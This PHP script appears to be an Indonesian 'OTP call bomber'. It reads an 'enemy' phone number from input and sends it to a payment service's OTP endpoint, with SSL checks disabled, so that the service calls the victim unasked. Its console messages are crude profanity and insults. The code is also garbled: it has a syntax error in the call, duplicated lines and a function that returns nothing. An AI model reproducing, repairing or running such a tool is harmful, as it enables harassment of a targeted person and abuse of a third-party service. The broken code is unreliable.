<?php
# echo "CallAndreas5"
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 10);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=10call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}


echo "Lo Ngapain Di Script Gua Babi ? Jangan Tau Make Aja Babi Lu Tau Memek Gak ? Itu Kesukaan Gua Anjing ; SGBTEAM\n\n";
echo "NomorMusuhAnjing\nLoTauInputGakBabi? : ";
$nomor = trim(fgets(STDIN));
$execute = send($10nomor);
print $execute;
# echo "terkirim mampusssssd"
?>
